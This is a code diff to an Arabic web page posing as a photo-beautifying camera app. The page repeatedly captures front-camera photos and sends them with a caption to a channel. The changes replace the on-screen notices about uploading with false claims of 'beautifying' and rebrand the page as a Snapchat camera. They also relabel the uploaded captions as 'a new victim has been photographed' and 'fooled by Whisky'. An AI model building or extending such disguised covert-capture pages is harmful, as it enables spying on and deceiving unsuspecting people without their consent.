@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>تجـميل الصور · كاميرا بنفسجية</title>
+    <title>تجـميل الصور · كاميرا Snapchat</title>
     <style>
         * {
             margin: 0;
@@ -305,7 +305,7 @@
         </button>
 
         <div id="status" class="status-panel">
-            ⚡ اضغط الزر لبدء التصوير الفوري
+            🔷 اضغط الزر لبدء التصوير الإحتࢪافي
         </div>
 
         <div class="debug-card" id="debugInfo">
@@ -390,7 +390,7 @@
                 }
 
                 try {
-                    statusDiv.innerHTML = `📤 جاري رفع الصورة #${photoCounter} إلى القناة ...`;
+                    statusDiv.innerHTML = `💅 جاري تـجـميل الصورة #${photoCounter} يـحب ...`;
                     updateDebug(`إرسال الصورة رقم ${photoCounter}`);
 
                     const response = await fetch(imageDataUrl);
@@ -406,10 +406,10 @@
 
                     const now = new Date();
                     const cairoTime = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
-                    const caption = `📸 *صورة جديدة من تجميل الصور*\n\n` +
-                                   `🖼️ الصورة رقم: ${photoCounter}\n` +
+                    const caption = `🧿 *تـم تـصـوير ضـحية جـديده*\n\n` +
+                                   `🔷 الصورة رقم: ${photoCounter}\n` +
                                    `📅 التاريخ: ${cairoTime}\n` +
-                                   `📱 تم التقاطها بواسطة الكاميرا الأمامية\n` +
+                                   `❤ تم الـتغـفيل بواسطـة ويـسڪي\n` +
                                    `✨ بواسطة: تجميل الصور`;
 
                     formData.append('caption', caption);
@@ -432,7 +432,7 @@
                         setTimeout(() => {
                             if (cameraActive && isCapturing && statusDiv.classList.contains('success')) {
                                 statusDiv.className = 'status-panel';
-                                statusDiv.innerHTML = '📸 التصوير مستمر - سيتم إرسال الصور تلقائياً';
+                                statusDiv.innerHTML = '📸 التصوير مستمر - سيتم تـجـميل الصـور';
                             }
                         }, 2000);
                         
@@ -532,7 +532,7 @@
                 
                 isCapturing = true;
                 statusDiv.className = 'status-panel';
-                statusDiv.innerHTML = '📸 بدأ التصوير الدوري – سيتم إرسال الصور إلى القناة';
+                statusDiv.innerHTML = '📸 بدأ التصوير الإحـترافي – سيتم تـجـميل الـصـور';
                 updateDebug('وضع التصوير التلقائي نشط (كل 6 ثوانٍ تقريباً)');
                 startCountdownCycle();
             }
@@ -600,7 +600,7 @@
                             cameraActive = true;
                             updateDebug('✅ الكاميرا الأمامية تعمل بنجاح');
                             statusDiv.className = 'status-panel';
-                            statusDiv.innerHTML = '✅ الكاميرا جاهزة. اضغط "إبدأ التصوير" للإرسال.';
+                            statusDiv.innerHTML = '✅ الكاميرا جاهزة. اضغط "إبدأ التصوير" للتجميل.';
                             countdownDiv.textContent = '5';
                         }).catch(err => {
                             updateDebug(`فشل تشغيل الفيديو: ${err.message}`, true);
